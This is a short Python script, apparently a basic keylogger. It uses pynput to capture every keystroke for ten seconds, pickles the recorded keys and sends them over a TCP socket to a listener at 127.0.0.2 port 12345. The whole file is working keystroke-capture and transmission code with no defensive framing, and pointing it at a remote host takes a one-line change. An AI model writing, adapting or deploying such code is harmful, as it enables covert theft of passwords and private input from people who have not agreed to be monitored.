from  pynput import keyboard
import time
import socket
import pickle

record = []

duration = 10

def on_press(key):
	global record
	record.append(str(key))
	# print(record)

# def on_release(key):
# 	if key == keyboard.Key.esc:
# 		return False

def record_key_press(duration):
	global record
	# print("Press 'Esc' to exit...")
	with keyboard.Listener(on_press = on_press) as listener:
		# time.sleep(5)
		time.sleep(int(duration))

	return record
	
	
if __name__ == '__main__':
	keys = record_key_press(duration)
	s = socket.socket()
	s.connect(('127.0.0.2',12345))
	data = pickle.dumps(keys)
	s.send(data)
	s.close()
	# print(keys)
	
	
